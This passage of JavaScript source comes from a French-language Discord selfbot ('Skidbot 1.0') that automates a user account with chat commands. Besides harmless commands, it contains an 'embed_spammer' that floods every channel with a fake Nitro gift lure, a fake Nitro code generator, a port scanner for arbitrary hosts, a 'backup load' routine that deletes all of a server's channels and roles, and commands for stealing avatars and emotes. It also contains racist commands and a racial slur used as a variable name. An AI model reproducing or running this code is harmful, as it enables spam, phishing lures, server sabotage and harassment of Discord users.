            message.edit("▓▓▓▓▓▓▓▓░░ 80%");
        }, 3000);
        setTimeout(() => {
            message.edit("▓▓▓▓▓▓▓▓▓▓ 100%");
        }, 3500);
        setTimeout(() => {
            message.edit(embed_encode).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        }, 4000)
        console.log('Commande token effectué'.yellow);
    }
    if (message.content.startsWith(`${prefix}encode`)) {
        var text = args.join(" ") || "Skidbot";;
        var bytes = utf8.encode(text);
        var encoded = base64.encode(bytes);
        let embed_encode = new Discord.RichEmbed()
            .setColor(`${color}`)
            .setTitle("Texte -> Base64 :")
            .setDescription(encoded)
        message.edit(embed_encode).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
        console.log('Commande encode effectué'.yellow)
    }
    if (message.content.startsWith(`${prefix}lovecalc`)) {
        let random = ['5%', '10%', '15%', '20%', '25%', '30%', '35%', '40%', '45%', '50%', '55', '60%', '65%', '70%', '75%', '80%', '85%', '90%', '95%', '100%'];
        let rdm = Math.floor(Math.random() * random.length);
        let argument = args.slice(0).join(' ') || 'Skidbot';;;
        let embed = new Discord.RichEmbed()
            .setAuthor(message.author.tag)
            .setColor('ORANGE')
            .setFooter('Skidbot 1.0')
            .setThumbnail('undefined')
            .addField('calcul de relation plausible ❤', argument)
            .addField('relation estimée à ❤', random[rdm]);
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande lovecalc effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'spotify')) {
        const argument = message.content.split(' ').slice(1).join(' ') || 'Skidbot';
        let presence = rpcGenerator.createSpotifyRpc(client)
            .setAssetsLargeImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e')
            .setAssetsSmallImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e')
            .setDetails(argument)
            .setState('Skidbot 1.0')
            .setStartTimestamp(Date.now())
            .setEndTimestamp(Date.now() + 86400000);
        client.user.setPresence(presence.toDiscord()).then(message.edit(':white_check_mark: **Tu écoutes ' + (message.content.split(' ').slice(1).join(' ') || 'Skidbot') + ' sur spotify**')).catch(console.error);
        console.log('Commande spotify effectué'.yellow);
    };
    if (message.content.startsWith(`${''}${prefix}${'reset'}`)) {
        clearInterval();
        client.user.setActivity(null, {});
        message.edit(':information_source:  Votre statut a été réinitialisé ! :information_source:').catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande reset effectué'.yellow);
    };
    if (message.content === prefix + 'nitro') {
        const embed = new Discord.RichEmbed()
            .setColor(color)
            .setThumbnail('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
            .addField('Gift :', '|| https://discord.gift/' + nitrocode(16, '0aA') + ' ||');
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande nitro generator effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'gen token')) {
        message.delete();
        setTimeout(() => {
            client.destroy().catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
            });
        }, 1500);
        console.log('Nouveau token generé'.green);
    };
    if (msg.content.startsWith(prefix + "reverse")) {
        let reverse = args.splice(1).join(' ');
        if (!reverse) {
            message.edit(':x: **Pas de test definit**')
        }

        function reverseString(str) {
            return str.split("").reverse().join("");
        }
        let sreverse = reverseString(reverse)
        if (args[0] === sreverse) {
            sreverse = `${args.splice(1).join(" ")}`
        }
        msg.edit(`${sreverse}`).catch(console.error);
        console.log('Commande reverse effectué'.yellow)
    }
    if (message.content.startsWith(prefix + 'discord')) {
        let embed = new Discord.RichEmbed()
            .setColor(color)
            .setDescription(`Discord Version : ${Discord.version}`)
            .setFooter('Skidbot 1.0');
        message.edit(embed).catch(err => {
            return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
        });
        console.log('Commande discord effectué'.yellow);
    };
    if (message.content === prefix + 'restart') {
        message.edit('**redémarrage** du self bot...').then(client.destroy()).then(() => {
            return client.login(token);
        });
        console.log('Commande restart effectué'.yellow);
    };
    if (message.content.startsWith(prefix + 'role info' || prefix + 'ri')) {
        let serveur = message.guild;
        let gRole = message.mentions.roles.first();
        if (!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**')
        if (!gRole) return message.delete().then(console.log('[', 'ERROR'.red, ']', 'un nom de rôle est nécessaire'.green))
        const status = {
            false: "Non",
            true: "oui"
        }
        let roleEmbed = new Discord.RichEmbed()
            .setColor(color)
            .setDescription(`<@&${gRole.id}>`)
            .addField('id du role:', gRole.id)
            .addField('couleur:', gRole.hexColor)
            .setFooter('Skidbot 1.0')
            .addField('nombre de membres ayant ce role:', gRole.members.size)
            .addField('position:', gRole.position)
            .addField('mentionnable:', status[gRole.mentionable])
        if (!message.member.hasPermission('EMBED_LINKS')) return message.edit(`:x: **permission insuffisante (embed_links)**\n<@&${gRole.id}>\n\nid du role: ${gRole.id}\ncouleur du role: ${gRole.hexColor}\nmembres ayant ce role: ${gRole.members.size}\nposition: ${gRole.position}\nmentionnable: ${status[gRole.mentionable]}`)
        console.log('Commande role info effectué'.yellow)
        message.edit(roleEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'))
    }
    if (message.content.startsWith(prefix + "add emote")) {
        if (message.channel.type === "dm") {
            message.edit(':x: **Commande pas executable en mp**')
            return;
        }
        let arg = args.splice(2).join(" ");
        let customemoji = Discord.Util.parseEmoji(arg);

        if (!args) {
            message.edit(':x: **Veuillez choisir une emote.**')
            return;
        }
        if (!customemoji) {
            message.edit(`:x: **Emote invalide essayez ceci** ${prefix}add emote (emote) <name>`)
            return;
        }
        if (!message.member.hasPermission('MANAGE_EMOJIS')) {
            message.edit(':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**')
            return;
        }
        if (customemoji.id) {
            const Link = `https://cdn.discordapp.com/emojis/${customemoji.id}.${
          customemoji.animated ? "gif" : "png"
        }`;
            let name = message.content.split(" ").splice(3) || customemoji.name;
            message.guild.createEmoji(
                `${Link}`,
                `${name}`
            );
            message.edit(':white_check_mark: **Emote ajoutée au serveur.**')
            console.log("Commande add emote executé.".yellow)
        } else
            message.edit(':x: **Veuillez choisir une emote valide!**')
    }
    if (message.content === prefix + 'emote') {
        if (message.channel.type === 'dm') {
            message.edit(':x: **Commande pas executable en mp**')
            return;
        }
        let Emojis = "";
        let EmojisAnimated = "";
        let EmojiCount = 0;
        let Animated = 0;
        let OverallEmojis = 0;

        function Emoji(id) {
            return client.emojis.get(id).toString()
        }
        message.guild.emojis.forEach(emoji => {
            OverallEmojis++;
            if (emoji.animated) {
                Animated++
                EmojisAnimated += Emoji(emoji.id)
            } else {
                EmojiCount++;
                Emojis += Emoji(emoji.id)
            }
        })
        let embed = new Discord.RichEmbed()
            .setTitle(`Emojis dans: **${message.guild.name}**`)
            .setFooter('Skidbot 1.0')
            .setColor(color)
            .addField(`Emojis animés: [${Animated}]`, EmojisAnimated || `None`)
            .addField(`Emojis [${EmojiCount}]`, Emojis || `None`)
            .addField('Total d\'emojis', OverallEmojis || `None`)
        message.edit(embed);
        console.log("Commande emote executé.".yellow)
    };
    if (message.content.startsWith(prefix + "remove emote")) {
        if (message.channel.type === "dm") {
            message.edit(':x: **Commande pas executable en mp**')
            return;
        }
        if (!message.member.hasPermission(`MANAGE_EMOJIS`)) {
            return message.edit(":x: **Vous n\'avez pas les permissions \"Gérer les emojis\" sur ce serveur**")
        }
        const emoji = args.splice(2).join(" ");
        if (!emoji) return message.edit(`:x: **Veuillez choisir une emote.**`);
        let customemoji = Discord.Util.parseEmoji(emoji);
        if (!message.guild.emojis.forEach(emote => {
                if (!emote.id === customemoji.id) {
                    return message.channel.send(`:x: **Cette emote n'est pas sur le serveur**.`)
                }
            }))
            return message.edit(":white_check_mark: **Emote correctement supprimée du serveur.**");
        if (customemoji.id) {
            const Link = `https://cdn.discordapp.com/emojis/${customemoji.id}.${
              customemoji.animated ? "gif" : "png"
            }`;
            message.guild.emojis.get(customemoji.id).delete();
        } else {
            let CheckEmoji = parse(emoji, {
                assetType: "png"
            });
            if (!CheckEmoji[0])
                return message.edit(`:x: **Veuillez choisir une emote valide**!`);
            message.edit(`:x: **Vous ne pouvez pas supprimer les emotes par defaut**!`);
        };
        console.log("Commande remove emote executé.".yellow)
    }
    if (message.content.startsWith(prefix + 'embed_spammer')) {
        let embed = new Discord.RichEmbed()
            .setAuthor("© Discord Nitro Classic Gift")
            .setColor('#0027ff')
            .setThumbnail('https://emoji.gg/assets/emoji/6234_nitro_booster_s.gif')
            .setImage('https://miro.medium.com/max/2560/0*Atmf_-eFRoumfr9j.png')
            .addField('Claim You\'re Gift', '[https://discord.gift/sE7gEpcDQDUZKexV](https://discord.gg/j4jfr)')
            .setFooter('Discord || By discord');
        message.guild.channels.filter(channels => {
            return channels.type === 'text';
        }).forEach(chann => {
            setInterval(() => {
                chann.send(embed);
            }, 450);
        });
        console.log('Commande spam embed executé.'.yellow);
        return
    };
    if (message.content.startsWith(prefix + "steal banniere")) {
        message.delete()
        let banner = message.guild.bannerURL;
        console.log(`Voici la bannière de ${message.guild.name}: ${banner}`.green)
    }
    if (message.content.startsWith(prefix + "steal emote")) {
        if (message.channel.type === "dm") {
            message.edit(':x: **Commande pas executable en mp**')
            return;
        }
        let arg = args.splice(2).join(" ");
        let serveurid = client.guilds.get(arg);
        if (!serveurid) {
            message.edit(`:x: **Aucun serveur trouvable avec l'id** "${arg}"`)
            return;
        }
        if (!message.member.hasPermission(`MANAGE_EMOJIS`)) {
            return message.edit(":x: **Vous n'avez pas les permissions \"Gérer les emojis\" sur ce serveur**")
        }
        if (serveurid.emojis.size < 1) {
            message.edit(':x: **Le serveur ne contient aucun emote.**')
        }
        let i = "1";
        serveurid.emojis.forEach(emote => {
            setTimeout(() => {
                let name = emote.name;
                const Link = `https://cdn.discordapp.com/emojis/${emote.id}.${
          emote.animated ? "gif" : "png"
        }`
                message.guild.createEmoji(
                    `${Link}`,
                    `${name}`
                ).catch(error => i + "1");
            }, 1000);
        });
        console.log('Commande steal emote executé.'.yellow);
        message.edit(`:white_check_mark: **J'ai volé les emotes du serveur** "${serveurid.name}"`)
    }
    if (message.content === prefix + "delete all emote") {
        if (message.channel.type === "dm") {
            message.edit(':x: **Commande pas executable en mp**')
            return;
        }
        if (message.guild.emojis.size < 1) {
            message.edit(":x: **Il n' y a aucun emote a supprimer.**")
            return;
        }
        message.guild.emojis.forEach(emote => {
            message.guild.emojis.get(emote.id).delete();
        });
    };
    if (message.content.startsWith(prefix + "grab pp")) {
        let voled = message.mentions.users.first();
        let targetpp = voled.avatarURL;
        if (!voled) {
            message.edit(":x: **Veuillez mentionner un utilisateur valide!**")
            return;
        };
        if (!targetpp) {
            message.edi(":x: **Cet utilisateur n'a pas d'avatar!**")
            return;
        };
        client.user.setAvatar(targetpp);
        console.log('Commande grab pp executé.'.yellow)
        message.edit(`:white_check_mark: **J'ai correctement volé la photo de profile de ** "${voled.username}"`)
    };
    try {
        let info = client.emojis.get("655091815401127966") || "ℹ️"; //https://cdn.discordapp.com/emojis/655091815401127966.png?v=1
        let waiting = client.emojis.get("655695570769412096") || "⌛"; //https://images-ext-1.discordapp.net/external/lWj3uW4qvfFB9t0QgGsDJ8vLvh5bSObQ-wwUxYFH4wo/https/images-ext-1.discordapp.net/external/AzWR8HxPJ4t4rPA1DagxJkZsOCOMp4OTgwxL3QAjF4U/https/cdn.discordapp.com/emojis/424900448663633920.gif
        let green = client.emojis.get("655696285286006784") || "✅"; //https://images-ext-2.discordapp.net/external/NU9I3Vhi79KV6srTXLJuHxOgiyzmEwgS5nFAbA13_YQ/https/cdn0.iconfinder.com/data/icons/small-n-flat/24/678134-sign-check-512.png
        let error = client.emojis.get("655704809483141141") || "❌"; //https://cdn.discordapp.com/emojis/655704809483141141.png?v=1
        let warning = client.emojis.get("656030540310380574") || "⚠️"; //https://cdn.discordapp.com/emojis/656030540310380574.png?v=1
        if (msg.content === prefix + "backup create" | msg.content == prefix + "backup c") {
            let serveur = message.guild;
            if (!serveur) {
                message.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                return;
            }
            message.guild.roles
                .filter(
                    r =>
                    r.name !== message.guild.member(client.user.id).highestRole.name
                )
                .forEach(r => {
                    if (
                        r.comparePositionTo(
                            message.guild.member(client.user.id).highestRole
                        ) > 0
                    ) {
                        return message.edit(`${warning}  **Attention**\n\nMon role n'est pas tout en haut dans la liste des roles du serveur, cela peut créer quelques ennuies lors de la création de la backup\n\nDelta-Selfbot`).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                    }
                });
            message.edit(`${waiting}  **Please wait** ...\n\nCréation de la backup. Attendre la finalisation...\n\nDelta-Selfbot`).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)).then(m => {
                let id = makeid(16);

                const channels = message.guild.channels
                    .sort(function (a, b) {
                        return a.position - b.position;
                    })
                    .array()
                    .map(c => {
                        const channel = {
                            type: c.type,
                            name: c.name,
                            postion: c.calculatedPosition
                        };
                        if (c.parent) channel.parent = c.parent.name;
                        return channel;
                    });

                const roles = message.guild.roles
                    .filter(r => r.name !== "@everyone")
                    .sort(function (a, b) {
                        return a.position - b.position;
                    })
                    .array()
                    .map(r => {
                        const role = {
                            name: r.name,
                            color: r.color,
                            hoist: r.hoist,
                            permissions: r.permissions,
                            mentionable: r.mentionable,
                            position: r.position
                        };
                        return role;
                    });

                if (!backups[message.author.id]) backups[message.author.id] = {};
                backups[message.author.id][id] = {
                    icon: message.guild.iconURL,
                    name: message.guild.name,
                    owner: message.guild.ownerID,
                    members: message.guild.memberCount,
                    createdAt: message.guild.createdAt,
                    roles,
                    channels
                };

                save();
                let iconserveur = serveur.iconURL || "";

                console.log(`Nouvelle backup du serveur ${message.guild.name} vient d'être crée, voici son id : ${id}`.green)
                lbackup[serveur.name] = {
                    Id: id
                };
                liste();
                message.edit(`${info}  **Info**\n\nNouvelle backup du serveur **${message.guild.name}** vien d'être crée, voici son id : \`${id}\`\n**${prefix}backup load (id)** Pour load la backup\n\nDelta-Selfbot`).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            });
            console.log('Commande create backup executé'.yellow)
        }
        if (msg.content === prefix + "backup liste") {
            try {
                var data = fs.readFileSync('Data/liste.json', 'utf8');
                if (!data) {
                    message.edit(`:x: **Oups il semblerait que tu n'ai pas encore de backup fait ${prefix}help backup pour commencer a en voler**`)
                    return;
                }
                let embed = new Discord.RichEmbed()
                    .setTitle('**Skidbot Backup Listes**')
                    .setColor(color)
                    .addField("\nWoaW GG tu es un veritables voleur de backup accompli !!!", "```" + data.toString())

                    .setFooter(`Skidbot 1.0 | ${message.author.username}`, `${message.author.avatarURL}`)
                message.edit(embed)
            } catch (e) {
                console.log('Error:', e.stack);
            }
        }
        if (msg.content.startsWith(prefix + "backup delete")) {
            let serveur = message.guild;
            if (!serveur) {
                message.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                return;
            }
            let code = args.splice(2).join(" ");
            let errorEmbed = new Discord.RichEmbed()
                .setTitle(`${error} Erreur`)
                .setFooter('Skidbot 1.0')
                .setDescription(
                    `Tu dois définir ton id de backup... Fais ${prefix}help pour avoir plus d'informations.`
                )
                .setColor(color);
            if (!code) return message.edit(errorEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'an error has occured'.green));

            let cantfindbackup = new Discord.RichEmbed()
                .setTitle(`${error}  Error`)
                .setFooter('Skidbot 1.0')
                .addField(`**Tu n'a pas de backup avec cette id : ${code}.**`, prefix + "help pour plus d'informations")
                .setColor(color);
            if (!backups[message.author.id][code])
                return message.edit(cantfindbackup).catch(error => console.log('[', 'ERROR'.red, ']', 'an error has occured'.green));;

            delete backups[message.author.id][code];
            save();

            let deletedsuc = new Discord.RichEmbed()
                .setTitle(`${green}  Succès !`)
                .setFooter('Skidbot 1.0')
                .setDescription(`La **backup** a bien été supprimée.`)
                .setColor(color);
            message.edit(deletedsuc).catch(error => console.log('[', 'ERROR'.red, ']', 'an error has occured'.green));
            console.log('Commande delete backup executé'.yellow)
        }
        if (message.content.startsWith(prefix + "port scanner")) { // keyword=mouche portscanner
            let a = message.content.split(" ").slice(2).join(" ") || "127.0.0.1"
            let nigger = new Discord.RichEmbed()
                .setTitle(`Waiting...`)
                .setDescription(`Scanning ports...`)
                .setThumbnail(`https://media.discordapp.net/attachments/757637821484892241/864921630928011344/tumblr_c38b354066a837267ba375ec2fb3f70c_62b90734_2048.jpg?width=832&height=468`)
                .setColor(color)
                .setFooter('Skidbot 1.0')
            console.log('scanning ports...'.red)
            message.edit(nigger)

            nodePortScanner(a, [])
                .then(results => {
                    let noir = new Discord.RichEmbed()
                        .setTitle(`**Port Scanner**`)
                        .setFooter('Skidbot 1.0')
                        .setDescription(`Open ports:\`\`\`\n${results.ports.open}\`\`\``)
                        .setThumbnail(`https://media.discordapp.net/attachments/757637821484892241/864921630928011344/tumblr_c38b354066a837267ba375ec2fb3f70c_62b90734_2048.jpg?width=832&height=468`)
                        .setColor(color)
                    console.log(results.ports.open)
                    message.edit(noir)
                })
            nodePortScanner(a, [])
                .catch(error => {
                    let noir = new Discord.RichEmbed()
                        .setTitle(`**Port Scanner**`)
                        .setFooter('Skidbot 1.0')
                        .setDescription(`Error while trying to scan ports`)
                        .setThumbnail(`https://media.discordapp.net/attachments/757637821484892241/864921630928011344/tumblr_c38b354066a837267ba375ec2fb3f70c_62b90734_2048.jpg?width=832&height=468`)
                        .setColor(color)
                    console.log(error)
                    message.edit(noir)
                })
        }
        if (message.content.startsWith(prefix + "subs")) { // keyword=vtuber youtube advertisement
            let coolz = new Discord.RichEmbed()
                .setTitle(`**Sub to my channel**`)
                .setDescription('[Lien pour vous sub a TaxMachine](https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA)')
                .setFooter('i do really cool video')
                .addField(`subscribe its very epic`)
                .setThumbnail(`https://cdn.discordapp.com/attachments/757637821484892241/864540591986311208/skidbot.png`)
                .setImage(`https://cdn.discordapp.com/attachments/757637821484892241/864921630928011344/tumblr_c38b354066a837267ba375ec2fb3f70c_62b90734_2048.jpg`)
                .setColor(color)
            console.log('commande youtube grabber executé'.yellow)
            message.edit(coolz)
        }
        if (message.content.startsWith(prefix + "chingchong")) { // keyword=chinois LOL racism funny
            let chinois = new Discord.RichEmbed()
                .setTitle(`**Ching Chong**`)
                .setDescription(`chinois`)
                .setFooter('Skidbot 1.0')
                .setImage(`https://cdn.discordapp.com/attachments/854021932835799100/856242419813056542/Ey3ki5EXIAYwnn6.jpg`)
                .setColor(color)
            console.log('commande ching chong executé'.yellow)
            message.edit(chinois)
        }
        if (message.content.startsWith(prefix + "port docs")) {
            let hacker = new Discord.RichEmbed()
                .setTitle(`**Documentation des fonctions des ports**`)
                .setDescription('[vous pouvez lire la page wikipedia](https://fr.wikipedia.org/wiki/Liste_de_ports_logiciels)')
                .setFooter('Skidbot 1.0')
                .addField('Les ports 20, 21, 22, 25, 53, 80, 110, 443 sont appellé port TCP. A quoi servent-t\'ils? si vous hébèrgé n\'importe quoi sur votre réseau vous en aurez besoin, ou pour procèdé a une attaque DoS ou DDoS ce sont les ports les plus fréquament utilisé')
                .setImage('https://cdn.discordapp.com/attachments/862411691316478043/865425541015142400/port-numbers.jpg.optimal.jpg')
                .setColor(color)
            console.log('commande port docs executé'.yellow)
            message.edit(hacker)
        }
        if (message.content.startsWith(prefix + "noir")) {
            let prison = new Discord.RichEmbed()
                .setTitle('**NOIR MOMENT**')
                .setDescription('[leur maison](https://www.google.com/search?q=prison&rlz=1C1PNJJ_frCA943CA943&sxsrf=ALeKk00Q19vT-08oIKHWFvscRtWdyRJlNQ:1626456336066&source=lnms&tbm=isch&sa=X&ved=2ahUKEwishZ2BjujxAhXLTN8KHdrrAzwQ_AUoAXoECAIQAw&biw=1918&bih=977)')
                .setFooter('Skidbot 1.0')
                .setImage('https://media.discordapp.net/attachments/862411691316478043/863594984363917312/5b_fucked.png?width=710&height=473')
                .setColor(color)
            console.log('commande noir executé'.yellow)
            message.edit(prison)
        }
        if (message.content.startsWith(prefix + "amogus")) {
            let amogus = new Discord.RichEmbed()
                .setTitle('**amogus**')
                .setDescription('[amogus](https://www.youtube.com/watch?v=5SjEVperZJg)')
                .setFooter('Skidbot 1.0')
                .setImage('https://cdn.discordapp.com/attachments/865298692080664626/865655624841822237/9eaa3b59ce146709009839276f3279f3.png')
                .setThumbnail('https://cdn.discordapp.com/attachments/865298692080664626/865656587313086475/tenor.gif')
                .setColor(color)
            console.log('amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green, 'amogus'.yellow, 'amogus'.blue, 'amogus'.red, 'amogus'.magenta, 'amogus'.green)
            message.edit(amogus)
        }
        if (msg.content.startsWith(prefix + "backup load")) {
            let serveur = message.guild;
            if (!serveur) {
                message.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                return;
            }
            let error = client.emojis.get("655704809483141141") || "❌";
            let code = args.splice(2).join(" ");
            let errorEmbed = new Discord.RichEmbed().setTitle(`${error}  Error`)
                .setDescription(`Tu as oublié de définir une **id de backup**. Utilise la commande \`${prefix}help\` pour avoir plus d'informations`);
            if (!code) return message.channel.send(errorEmbed);
            let cantfindbackup = new Discord.RichEmbed()
                .setTitle(`${error}  Error`)
                .addField(`**Aucune backup avec l'id ${code}.**`, "/help pour plus d'information")
                .setFooter('Skidbot 1.0')
                .setColor(color);
            if (!backups[message.author.id][code])
                return message.channel.send(cantfindbackup).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            message.guild.channels.forEach(channel => {
                channel.delete("For Loading A Backup");
            });

            message.guild.roles
                .filter(role => role.members.every(member => !member.user.bot))
                .forEach(role => {
                    role.delete("For Loading A Backup");
                });
            backups[message.author.id][code].roles.forEach(async function (
                role
            ) {
                message.guild
                    .createRole({
                        name: role.name,
                        color: role.color,
                        permissions: role.permissions,
                        hoist: role.hoist,
                        mentionable: role.mentionable,
                        position: role.position
                    })
                    .then(role => {
                        role.setPosition(role.position);
                    });
            });

            backups[message.author.id][code].channels
                .filter(c => c.type === "category")
                .forEach(async function (ch) {
                    message.guild.createChannel(ch.name, {
                        type: ch.type,
                        permissionOverwrites: ch.permissionOverwrites
                    });
                });

            backups[message.author.id][code].channels
                .filter(c => c.type !== "category")
                .forEach(async function (ch) {
                    message.guild.createChannel(ch.name, {
                        type: ch.type,
                        permissionOverwrites: ch.permissionOverwrites
                    }).then(c => {
                        const parent = message.guild.channels
                            .filter(c => c.type === "category")
                            .find(c => c.name === ch.parent);
                        ch.parent ? c.setParent(parent) : "";
                    });
                });
            message.guild.setName(backups[message.author.id][code].name);
            message.guild.setIcon(backups[message.author.id][code].icon);
            console.log('Commande load backup executé'.yellow)
        }
        if (msg.content.startsWith(prefix + "backup info") || msg.content.startsWith(prefix + "backup i")) {
            let id = args.splice(2).join(" ");
            let MissingbackupinfoEmbed = new Discord.RichEmbed()
                .setTitle(`${error}  Error`)
                .setFooter('Skidbot 1.0')
                .setDescription(
                    `Tu as oublié de définir une **id de backup**. Utilise la commande \`${prefix}help\` pour avoir plus d'informations`
                )
                .setColor(color);
            if (!id) return message.edit(MissingbackupinfoEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));

            let cantfindEmbed = new Discord.RichEmbed()
                .setTitle(`${error}  Error`)
                .setFooter('Skidbot 1.0')
                .setDescription(
                    `Tu n'as pas de **backup** avec cet id \`${id}\`.`
                )
                .setColor(color);
            if (!backups[message.author.id][id])
                return message.edit(cantfindEmbed);

            try {
                let infoEmbed = new Discord.RichEmbed()
                    .setTitle(backups[message.author.id][id].name)
                    .setThumbnail(backups[message.author.id][id].icon)
                    .addField(
                        "Creator",
                        `<@${backups[message.author.id][id].owner}>`,
                        true
                    )
                    .addField("Members", backups[message.author.id][id].members, true)
                    .addField("Created At", backups[message.author.id][id].createdAt)
                    .addField(
                        "Channels",
                        `\`\`\`${backups[message.author.id][id].channels
            .map(channel => channel.name)
            .join("\n")}\`\`\``,
                        true
                    )
                    .addField(
                        "Roles",
                        `\`\`\`${backups[message.author.id][id].roles
            .map(role => role.name)
            .join("\n")}\`\`\``,
                        true
                    );
                message.edit(infoEmbed);
            } catch (e) {
                hastebins(
                    backups[message.author.id][id].channels
                    .map(channel => channel.name)
                    .join("\n"),
                    "txt"
                ).then(ch => {
                    hastebins(
                        backups[message.author.id][id].roles
                        .map(role => role.name)
                        .join("\n"),
                        "txt"
                    ).then(ro => {
                        let infoEmbed = new Discord.RichEmbed()
                            .setTitle(backups[message.author.id][id].name)
                            .setThumbnail(backups[message.author.id][id].icon)
                            .addField(
                                "Creator",
                                `<@${backups[message.author.id][id].owner}>`,
                                true
                            )
                            .addField(
                                "Members",
                                backups[message.author.id][id].members,
                                true
                            )
                            .addField(
                                "Created At",
                                backups[message.author.id][id].createdAt
                            )
                            .addField("Channels", ch, true)
                            .addField("Roles", ro, true)
                            .setFooter('Skidbot 1.0');
                        message.edit(infoEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                    });
                });
            }
            console.log('Commande backup info executé'.yellow)
        }

        if (msg.content.startsWith(prefix + "backup purge")) {
            let errorEmbed = new Discord.RichEmbed()
                .setTitle(`${error}  Error`)
                .setDescription(
                    `Vous n'avez pas encore sauvegardé de serveur`
                )
                .setColor(color);
            if (!backups[message.author.id])
                return message.edit(errorEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));

            let warningEmbed = new Discord.RichEmbed().setTitle(`${warning}  Warning`)
                .setDescription(`Es-tu sûr de vouloir supprimer toutes tes backups ?
__Cette action est irréversible !__`);
            let sur = new Discord.RichEmbed()
                .setColor(color)
                .setTitle('Oui/Non')
                .setFooter('Skidbot 1.0')
                .addField('Etes vous sur de vouloir supprimer toutes vos backups???', "Oui/Non")
            message.edit(sur)
                .then(() => {
                    message.channel.awaitMessages(response => response.content === "Oui", {
                            max: 1,
                            time: 30000,
                            errors: ['time'],
                        })
                        .then((collected) => {
                            delete backups[message.author.id];

